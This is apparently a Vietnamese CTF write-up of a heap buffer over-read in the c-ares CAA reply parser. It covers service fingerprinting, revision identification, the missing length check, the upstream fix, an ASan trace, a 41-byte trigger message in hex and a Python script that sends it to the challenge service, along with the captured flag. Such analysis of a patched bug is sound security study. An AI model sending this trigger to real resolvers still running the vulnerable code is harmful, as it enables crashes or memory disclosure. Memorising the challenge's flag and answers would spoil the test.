---
title: "VULN#003"
category: "Vuln Research"
tags: ["c-ares", "dns", "caa", "out-of-bounds-read", "heap-buffer-overflow", "crash-oracle"]
solve_date: "2026-10-21T20:00:00+07:00"
language: "vi"
points: 40
---

# VULN#003 — CAA parser của c-ares đọc vượt hai byte khi RDATA rỗng

**Flag:** CTF{7be3ffc6c7dd708e925627551706e233}  
**Service:** 169.58.126.107:7028  
**Định dạng flag:** CTF{}

| Artifact | Bytes | Ghi chú |
|---|---:|---|
| c-ares-src.tar.gz | 374,950 | source tree cung cấp, c-ares tại 89e9eeb4 |
| Z1_caa_rdlen0.bin | 41 | message kích hoạt |

## Đề bài

> VULN#003 — 40 điểm. DNS response inspection service parse bất kỳ DNS reply nào bạn gửi. Có đúng source tree dùng để build binary target.

Handout là archive source c-ares resolver library. Service remote nhận TCP, sau đó 4 byte big-endian length và raw bytes tương ứng; nó parse nội dung như DNS response. Service trả một status line: bad length, not valid, no effect, insufficient hoặc confirmed. Chỉ memory-safety bug được chọn mới trả flag.

## Phân tích

### Protocol service

Framing được xác định bằng probe:

```text
text           -> b'status: bad length\n'
http           -> b'status: bad length\n'
2byte-A 44     -> b'status: bad length\n'
4byte-A 44     -> b'status: no effect\n'
R_8192 sent=8261 -> status: bad length
```

Prefix là 4 byte big-endian, không phải prefix DNS/TCP 2 byte. Giới hạn size nằm giữa probe lớn nhất được nhận (8097 byte) và probe đầu tiên bị từ chối (8261 byte). Service còn rate-limit khoảng một request mỗi phút; mỗi chuỗi probe được giãn khoảng 68 giây và thử lại khi gặp rate limited.

Verdict là phân loại ở application, không phải raw c-ares return code. Fingerprint 14 parser × 24 message cho thấy không parser đơn nào giải thích được output. Model khớp dữ liệu: not valid nghĩa là RR type hoặc question type không được app hỗ trợ (35/NAPTR, 99), hoặc structural walk thất bại (qdcount != 1, message truncated); no effect là type được hỗ trợ (1, 2, 5, 6, 15, 16, 28, 33, 257) parse bình thường. CAA (257) nằm trong nhóm được hỗ trợ.

### Tìm đúng revision

Mỗi file tarball được hash như git blob rồi so với upstream c-ares clone. Ở commit 89e9eeb4, 87/89 file giống từng byte; chỉ CMakeLists.txt và Makefile.am khác do duplicate basename trong build. Điều này xác định cây source:

```text
4d6975b3 2020-09-28 19:39:03 -0400 Fix OSSFuzz reported issue in CAA reply parsing
89e9eeb4 2020-09-26 11:05:22 -0400 fuzz CAA parsing (#363)
f5b4c085 2020-09-26 07:47:06 -0400 Allow parsing of CAA Resource Record (#360)
```

Cây được cung cấp cách hai ngày sau khi thêm CAA parsing và hai ngày trước security fix đầu tiên.

### Bug

src/lib/ares_parse_caa_reply.c đọc CAA critical flag và tag length trước khi kiểm tra RDATA dài ít nhất hai byte:

```c
      /* Check if we are really looking at a CAA record */
      if ((rr_class == C_IN || rr_class == C_CHAOS) && rr_type == T_CAA)
        {
          strptr = aptr;
          ...
          caa_curr->critical = (int)*strptr++;  
          caa_curr->plength = (int)*strptr++;
          if (caa_curr->plength <= 0 || (int)caa_curr->plength >= rr_len - 2)
            {
              status = ARES_EBADRESP;
              break;
            }
```

Bounds check RR ở trước chỉ từ chối RDATA vượt quá cuối message:

```c
      rr_len = DNS_RR_LEN (aptr);
      aptr += RRFIXEDSZ;
      if (aptr + rr_len > abuf + alen)
        {
          status = ARES_EBADRESP;
          break;
        }
```

Với rr_len == 0 và record nằm đúng cuối message, aptr == abuf + alen nên check qua được. Sau đó line 139 và 140 dereference strptr[0] và strptr[1] (strptr == aptr); cả hai đều ngoài message buffer. Kiểm tra plength chạy sau hai phép đọc đó, còn phép trừ rr_len - 2 là signed arithmetic và âm khi rr_len < 2 nên không khắc phục được.

### Fix

Commit 4d6975b3ec24aba44331d235bbcabf899be56cf2 thêm length guard còn thiếu:

```diff
           caa_last = caa_curr;
-
-          caa_curr->critical = (int)*strptr++;  
+          if (rr_len < 2)
+            {
+              status = ARES_EBADRESP;
+              break;
+            }
+          caa_curr->critical = (int)*strptr++;
           caa_curr->plength = (int)*strptr++;
           if (caa_curr->plength <= 0 || (int)caa_curr->plength >= rr_len - 2)
```

Commit message trỏ tới OSS-Fuzz issue 26012, do David Drysdale báo dưới dạng use-of-uninitialized-value. Khi build với ASan, phép đọc tương tự hiện thành heap-buffer-overflow.

### Tái hiện local

Viết harness copy input vào heap buffer đúng kích thước (malloc(n)), gọi từng c-ares reply parser rồi build static libcares.a với -fsanitize=address,undefined -fno-omit-frame-pointer -g -O1 trong container gcc:13. Fuzz theo cấu trúc (nhiều lượt 300k–500k message tạo tự động, gồm rdlength rất nhỏ và pointer vào RDATA) cho kết quả:

```text
==2996==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60400001dbf9
READ of size 1 at 0x60400001dbf9 thread T0
    #0 0x41abd6 in ares_parse_caa_reply /work/src/lib/ares_parse_caa_reply.c:139
    #1 0x4050d9 in run_parsers /work/harness/fuzz_harness.c:105
    #2 0x40af75 in main /work/harness/fuzz_harness.c:386

0x60400001dbf9 is located 0 bytes after 41-byte region [0x60400001dbd0,0x60400001dbf9)
allocated by thread T0 here:
    #0 0x770980c303ef in malloc (/usr/local/lib64/libasan.so.8+0xdb3ef)
    #1 0x40aeaa in main /work/harness/fuzz_harness.c:382

SUMMARY: AddressSanitizer: heap-buffer-overflow /work/src/lib/ares_parse_caa_reply.c:139 in ares_parse_caa_reply
```

## Lời giải

### 1. Dựng trigger tối thiểu

Message 41 byte là DNS response example.com/CAA bình thường, có một CAA answer với rdlength 0 và kết thúc đúng cuối buffer:

| Offset | Bytes | Field |
|---:|---:|---|
| 0x00 | 2 | ID abcd |
| 0x02 | 2 | flags 0x8180 |
| 0x04 | 2 | QDCOUNT 1 |
| 0x06 | 2 | ANCOUNT 1 |
| 0x08 | 4 | NSCOUNT 0, ARCOUNT 0 |
| 0x0c | 13 | example.com (label có length-prefix + root) |
| 0x19 | 4 | QTYPE 257, QCLASS 1 |
| 0x1d | 2 | answer name 0xc00c |
| 0x1f | 2 | TYPE 0x0101 (257, CAA) |
| 0x21 | 2 | CLASS 1 |
| 0x23 | 4 | TTL 300 |
| 0x27 | 2 | RDLENGTH 0 |

```text
abcd81800001000100000000076578616d706c6503636f6d0001010001c00c010100010000012c0000
```

Record vừa đúng 41 byte nên RDATA dài 0 nằm tại abuf + alen; cả hai lần đọc *strptr++ vượt allocation.

### 2. Chọn đúng RDATA length

Độ dài lân cận cho kết quả khác nhau cả local lẫn remote:

| Message | RDLENGTH | Local ASan | Remote |
|---|---:|---|---|
| Z1_caa_rdlen0 | 0 | overflow tại :139 | status: confirmed + flag |
| Z2_caa_rdlen1 | 1 | overflow tại :140 | status: insufficient |
| Z3_caa_rdlen2 | 2 | không crash (caa_reply=10) | không gửi |

RDATA một byte chỉ làm lần đọc thứ hai vượt biên; oracle phân loại insufficient. RDATA rỗng mới khiến cả hai phép đọc nằm ngoài buffer.

## Mã khai thác

```python
import socket, struct

HOST, PORT = "169.58.126.107", 7028


def qname(name):
    out = b""
    for label in name.split("."):
        out += bytes([len(label)]) + label.encode()
    return out + b"\x00"


header = struct.pack("!HHHHHH", 0xABCD, 0x8180, 1, 1, 0, 0)
question = qname("example.com") + struct.pack("!HH", 257, 1)     # CAA, IN
answer = (
    b"\xc0\x0c"                                                    # name -> question
    + struct.pack("!HHIH", 257, 1, 300, 0)                         # CAA, IN, ttl 300, rdlength 0
)
msg = header + question + answer
assert len(msg) == 41

s = socket.create_connection((HOST, PORT), timeout=15)
s.sendall(struct.pack("!I", len(msg)) + msg)
print(s.recv(4096).decode())
```

## Kết quả

Dòng log probe trong chuỗi gửi có giãn cách:

```text
Z1_caa_rdlen0            len=41    -> status: confirmed\x0aFLAG: CTF{7be3ffc6c7dd708e925627551706e233}\x0a [62B]
Z2_caa_rdlen1            len=42    -> status: insufficient\x0a [21B]
```

Gửi lại độc lập cùng message 41 byte:

```text
payload hex: abcd81800001000100000000076578616d706c6503636f6d0001010001c00c010100010000012c0000
attempt 0 -> b'status: confirmed\nFLAG: CTF{7be3ffc6c7dd708e925627551706e233}\n'
```

## Ghi chú

- Bug xuất hiện hai ngày sau khi revision được cung cấp: CAA parsing vào f5b4c085 ngày 2020-09-26, được patch bởi 4d6975b3 ngày 2020-09-28.
- OSS-Fuzz báo use-of-uninitialized-value; cùng hai phép đọc tạo heap-buffer-overflow dưới ASan. Cả hai mô tả cùng việc thiếu kiểm tra rr_len < 2.
- RDATA một byte chỉ over-read một byte và service trả insufficient; cần RDATA rỗng chứ không chỉ ngắn.
- Service dispatch theo RR type, nên bước fingerprint có ý nghĩa: giả thuyết ban đầu service gọi NAPTR parser là sai; NAPTR answer bị từ chối là not valid.
- Request bị giới hạn khoảng một lần mỗi phút; mỗi probe cách nhau khoảng 68 giây và retry khi gặp rate limited.

## Tham khảo

- c-ares src/lib/ares_parse_caa_reply.c tại 89e9eeb4efbd4ad487ef9c9debbe9920e7b3b236
- c-ares commit 4d6975b3ec24aba44331d235bbcabf899be56cf2 — “Fix OSSFuzz reported issue in CAA reply parsing”
- OSS-Fuzz issue 26012 — https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=26012
